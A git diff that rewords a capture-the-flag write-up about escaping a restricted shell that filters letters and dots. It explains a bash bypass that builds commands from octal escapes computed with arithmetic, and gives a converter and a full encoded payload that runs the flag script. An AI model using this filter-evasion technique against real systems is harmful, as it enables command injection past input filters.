@@ -14,8 +14,7 @@ Note: The service is restarted every hour at x:00.
 
 ## Solution 1
 
-The challenge is basically a limited shell that will filter almost everything you try, including letters, `.` (dot) and a lot of other things.
-Luckily, just a few days before a friend showed me a WAF bypass he found using bash, that I will go through quickly:
+The challenge presents a limited shell that filters almost everything you try, such as letters, dots, and some other characters. However, just a few weeks ago, a friend showed me a WAF bypass that works with bash, which I'll go trough quickly:
 
 ```
 ${0}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
@@ -23,12 +22,12 @@ ${0}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
 
 This is just a `ls` command.
 Breaking it into parts:
-- `${0}` in your terminal will mean the shell you're in, in this case, `bash`
+- `${0}` in your terminal refers to the shell you're in, in this case, `bash`
 - `<<<` indicates you're passing a [Here String](https://tldp.org/LDP/abs/html/x17837.html) to something.
 - `$(( ... ))` is the bash calculator
 - `1<<1` is a [Shift operation](https://www.interviewcake.com/concept/java/bit-shift) that results in `2`
-- `10011010` is decimal `154` represented in binary. When preceded with a `\`, most shells will take it as octal. \154 = `l`
-- `10100011` is decimal `163` represented in binary. When preceded with a `\`, most shells will take it as octal. \163 = `s`
+- `10011010` is the decimal `154` represented in binary. When preceded with a `\`, most shells will take it as octal. `\154` = `l`
+- `10100011` is the decimal `163` represented in binary. When preceded with a `\`, most shells will take it as octal. `\163` = `s`
 
 So in steps what we've got:
 
@@ -38,12 +37,13 @@ then:
 
 `bash<<<$\'\\154\\163\'`
 
-then:
+and finally:
 
 `bash<<<$\'ls'`
 
-Basically it's a bypass that uses a very strict and small charset. My mind went instantly there.
-After a few minutes trying to figure out how to add spaces to that bypass, i've come up with this converter:
+In essence, this bypass uses a very strict and small character set.
+
+After spending some time trying to figure out how to add spaces to this bypass, I created this converter:
 
 ```bash
 string=$*
@@ -68,13 +68,13 @@ string: 2f7072696e74666c61672e736820423473685f6272305448337273
 ${0}<<<{$\'\\$(($((1<<1))#111001))\\$(($((1<<1))#10100000))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10010111))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10100100))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\\$(($((1<<1))#111000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\',$\'\\$(($((1<<1))#1100110))\\$(($((1<<1))#1000000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\\$(($((1<<1))#10001001))\\$(($((1<<1))#10001110))\\$(($((1<<1))#10100010))\\$(($((1<<1))#111100))\\$(($((1<<1))#1111100))\\$(($((1<<1))#1101110))\\$(($((1<<1))#111111))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10100011))\',}
 ```
 
-then i just had to get the flag:
+Just copy and paste it into the remote shell:
 
 <img width="726" alt="image" src="https://user-images.githubusercontent.com/2973929/234142293-7f6fe5fd-d15c-402e-b088-2e1852c219fc.png">
 
 ## Solution 2
 
-I mean... I was happy that I had solved that challenge, but I spent the next days thinking my solution was overkill. As I ended up having a way to run any command I wanted, I could, for example, read the code for the limited shell:
+I mean... I was happy that I had solved the challenge, but in the following days, I couldn't help but think that my solution was overkill. Since I had found a way to execute any command I wanted, I was able to, for example, read the code for the limited shell:
 
 ```python
 #!/bin/usr/env python3
@@ -120,10 +120,10 @@ if __name__ == '__main__':
     main(create_tmp_dir())
 ```
 
-So I was sure it could be done "easier".
+So, I was convinced that there must be an "easier" way to solve this.
 
-After checking `env`, I found out that there was a variable named REMOTE_HOST that held the IP connected to the box.
-So that's what I came up with:
+Upon inspecting env, I discovered a variable named REMOTE_HOST that contained the IP address connected to the box, which would give me the `.` character needed to run `/printflag.sh`.
+That's when I came up with the following solution:
 
 ```bash
 #!/bin/bash
